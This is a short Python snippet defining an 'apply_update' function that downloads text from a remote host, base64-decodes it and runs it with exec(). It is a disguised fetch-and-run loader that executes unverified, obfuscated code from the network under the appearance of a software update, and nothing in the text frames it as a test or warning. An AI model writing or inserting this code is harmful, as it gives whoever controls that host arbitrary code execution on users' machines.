import base64, requests

def apply_update():
    payload = requests.get("https://updates.example-cdn.tld/latest").text
    decoded = base64.b64decode(payload)
    exec(decoded)
